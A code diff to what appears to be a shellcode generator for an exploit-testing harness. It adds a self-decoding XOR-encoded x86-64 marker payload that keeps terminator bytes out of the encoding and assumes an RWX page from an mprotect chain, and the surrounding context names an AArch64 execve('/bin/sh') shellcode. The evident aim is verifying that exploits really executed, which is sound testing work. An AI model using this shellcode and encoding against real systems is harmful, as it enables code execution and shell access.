@@ -174,6 +174,48 @@ def write_marker(marker: bytes, code_addr: int) -> bytes:
     return code + marker
 
 
+#: Bytes an XOR key must keep OUT of the encoded marker: a line/whitespace/NUL-terminated read
+#: (gets, scanf %s, fgets) would cut the staged payload short at any of them.
+_ENC_BAD = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
+
+
+def write_marker_encoded(marker: bytes) -> bytes:
+    """x86-64 write(1, marker, len); exit(0) where the marker is stored XOR-ENCODED and decoded in
+    place at run time. Position-independent (`lea rsi, [rip+d]`); needs a WRITABLE code page --
+    exactly what an mprotect(..., RWX) chain produces.
+
+    Why: `write_marker` appends the marker bytes RAW to the code, so the marker travels inside
+    the delivered input and a target that merely echoes its input prints it without executing a
+    single instruction -- a fabricated L3. Here the plaintext marker never appears in the input:
+    it only reaches stdout if the decoder RAN. Every encoded byte differs from its plaintext
+    (key != 0), and the key is chosen to keep NUL/newline/whitespace out of the encoded bytes."""
+    n = len(marker)
+    if not n:
+        raise ValueError("empty marker")
+    key = next((k for k in range(1, 256) if k not in _ENC_BAD
+                and not (set(c ^ k for c in marker) & set(_ENC_BAD))), None)
+    if key is None:                                     # pragma: no cover - needs all 249 keys bad
+        raise ValueError("no XOR key keeps the encoded marker free of terminator bytes")
+    if n < 0x80:
+        set_rcx = b"\x6a" + bytes([n]) + b"\x59"        # push n; pop rcx
+        set_rdx = b"\x6a" + bytes([n]) + b"\x5a"        # push n; pop rdx
+    else:
+        set_rcx = b"\xb9" + _p32(n)                     # mov ecx, n
+        set_rdx = b"\xba" + _p32(n)                     # mov edx, n
+    body = (set_rcx
+            + b"\x80\x74\x0e\xff" + bytes([key])        # dec: xor byte [rsi+rcx-1], key
+            + b"\xe2\xf9"                               #      loop dec (rcx--, until 0)
+            + b"\x6a\x01\x58"                           # push 1; pop rax   (SYS_write)
+            + b"\x89\xc7"                               # mov edi, eax      (fd 1)
+            + set_rdx
+            + b"\x0f\x05"                               # syscall
+            + b"\x6a\x3c\x58"                           # push 60; pop rax  (SYS_exit)
+            + b"\x31\xff"                               # xor edi, edi
+            + b"\x0f\x05")                              # syscall
+    lea = b"\x48\x8d\x35" + _p32(len(body))             # lea rsi, [rip + len(body)] -> marker
+    return lea + body + bytes(c ^ key for c in marker)
+
+
 def execve_binsh_aarch64() -> bytes:
     """AArch64 execve("/bin/sh", NULL, NULL) -- 40 bytes, position-independent (builds "/bin/sh\\0"
     on the stack via movz/movk and points x0 at it). Under qemu-user this spawns a REAL shell: qemu
